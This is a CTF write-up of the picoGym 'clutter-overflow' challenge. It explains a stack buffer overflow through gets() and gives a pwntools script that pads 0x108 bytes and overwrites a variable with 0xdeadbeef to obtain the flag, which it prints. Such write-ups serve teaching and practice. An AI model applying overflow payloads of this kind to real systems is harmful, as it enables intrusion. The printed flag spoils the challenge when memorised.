# picoGym - clutter-overflow

* **Category:** Binary Exploitation
* **Points:** 150

## Challenge

Clutter, clutter everywhere and not a byte to use. `nc mars.picoctf.net 31890`

## Solution
According to the chall.c file, the system will give us the flag if `code` is set to `0xdeadbeef`. While `code` cannot be directly modified, the `gets` function can read more input than the buffer that it has been given, and can be used to overflow the char array `clutter` to change `code`.

 Looking at the decompiled main function of chall in Ghidra, `local10` can be infered as `code` as it is being compared to `0xdeadbeef` , and `local118`  can be infered as `clutter` as it is a  character array. The difference between their character offsets is `0x108`, meaning that `0x108` characters have to be provided before overflowing `clutter` and modifying `code` to `0xdeadbeef`.

The following python script can be used to perform the attack. Uncomment the target line depending on whether the binary or the server is being attacked.
``````
from pwn import * #imports all of the tools from pwntools

#target = process('./chall') #executes the ELF if it is in the current directory
#target = remote('mars.picoctf.net', 31890) #starts a netcat to the specified target

payload = b'a'*0x108 #fills up the entire char array with a
payload += b'\xef\xbe\xad\xde' #overflows with 0xdeadbeef, little endian

target.sendline(payload) #sends the line

while True:
        print(target.recvline()) #prints all lines recieved
``````

`picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}`




## Thanks to PentaHex CTF for providing the template.
